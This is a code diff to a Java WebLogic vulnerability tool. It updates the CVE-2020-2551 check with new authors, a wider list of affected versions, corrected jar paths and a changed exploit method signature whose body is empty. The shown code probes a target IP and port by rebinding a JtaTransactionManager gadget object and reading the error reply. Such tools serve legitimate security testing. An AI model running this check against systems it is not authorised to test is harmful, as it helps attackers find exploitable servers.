@@ -2,6 +2,7 @@ package com.r4v3zn.weblogic.tools.payloads.impl;
 
 import com.r4v3zn.weblogic.tools.annotation.Authors;
 import com.r4v3zn.weblogic.tools.annotation.Dependencies;
+import com.r4v3zn.weblogic.tools.annotation.Tags;
 import com.r4v3zn.weblogic.tools.annotation.Versions;
 import com.r4v3zn.weblogic.tools.gadget.impl.JtaTransactionManagerGadget;
 import com.r4v3zn.weblogic.tools.payloads.VulTest;
@@ -38,9 +39,10 @@ import static org.apache.commons.lang3.StringUtils.isBlank;
  * @author R4v3zn
  * @version 1.0.0
  */
-@Authors({Authors.R4V3ZN})
+@Authors({Authors.R4V3ZN,Authors.LUFEI, Authors.SHUFUJIA})
 @Dependencies({":com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager"})
-@Versions({"10.3.6.0", "12.1.3.0", "12.1.4.0"})
+@Versions({"10.3.6.0", "12.1.3.0", "12.2.1.3.0", "12.2.1.4.0"})
+@Tags({"Nday"})
 @Log4j2
 public class CVE_2020_2551 implements VulTest {
     private static final String POC_NAME = "com.bea.core.repackaged.springframework.spring.jar";
@@ -56,7 +58,9 @@ public class CVE_2020_2551 implements VulTest {
         add("12.1.3.0");
         add("12.1.3.0.0");
         add("12.2.1.3.0");
+        add("12.2.1.3.0.0");
         add("12.2.1.4.0");
+        add("12.2.1.4.0.0");
     }};
 
     /**
@@ -75,10 +79,8 @@ public class CVE_2020_2551 implements VulTest {
             return false;
         }
         URLClassLoader urlClassLoader = null;
-        ClassPool classPool = null;
         try{
             urlClassLoader = loadClass(version);
-//            classPool = hookSocket(ip, port);
         }catch (Exception e){
             e.printStackTrace();
             return false;
@@ -108,7 +110,6 @@ public class CVE_2020_2551 implements VulTest {
         try{
             context.rebind("hello",object);
         }catch (Exception e){
-//            e.printStackTrace();
             String msg = e.getMessage();
             if("Unhandled exception in rebind()".equals(msg)){
                 urlClassLoader.close();
@@ -126,24 +127,20 @@ public class CVE_2020_2551 implements VulTest {
     /**
      * 加载 class loader
      * @param version
-     * @throws NotFoundException
+     * @throws Exception
      */
-    public URLClassLoader loadClass(String version) throws NotFoundException, MalformedURLException {
+    public URLClassLoader loadClass(String version) throws Exception {
         System.out.println("[*] load class com.bea.core.repackaged.springframework.spring.jar version --> "+version);
-//        log.debug("[*] load class com.bea.core.repackaged.springframework.spring.jar version --> "+version);
         String path = this.getClass().getResource("/lib/").getPath();
-        // Thread.currentThread().getContextClassLoader()
         String pocNamePath = path +"12.2.1.3.0/" + POC_NAME;
         String pocLogPath = path +"12.2.1.3.0/" + POC_LOG;
         String fullClientPath = path + FULL_CLIENT;
         if(version.contains("10.3.6") || version.contains("12.1.3")){
-            pocNamePath = path + "10.3.6.0.0/" + POC_NAME;
-            pocLogPath = path + "10.3.6.0.0/" + POC_LOG;
+            pocNamePath = path + "10.3.6.0/" + POC_NAME;
+            pocLogPath = path + "10.3.6.0/" + POC_LOG;
         }
         System.out.println("[*] jat path --> "+pocNamePath);
         System.out.println("[*] jat log path --> "+pocLogPath);
-//        log.debug("[*] jat path --> "+pocNamePath);
-//        log.debug("[*] jat log path --> "+pocLogPath);
         URL[] urls = new URL[]{new URL("file:"+pocNamePath), new URL("file:"+pocLogPath), new URL("file:"+fullClientPath)};
         return new URLClassLoader(urls,Thread.currentThread().getContextClassLoader());
     }
@@ -155,7 +152,7 @@ public class CVE_2020_2551 implements VulTest {
      * @throws Exception 抛出异常
      */
     @Override
-    public void exploit(String ip, Integer port) throws Exception {
+    public void exploit(String ip, Integer port, String... param) throws Exception {
         // no
     }
 
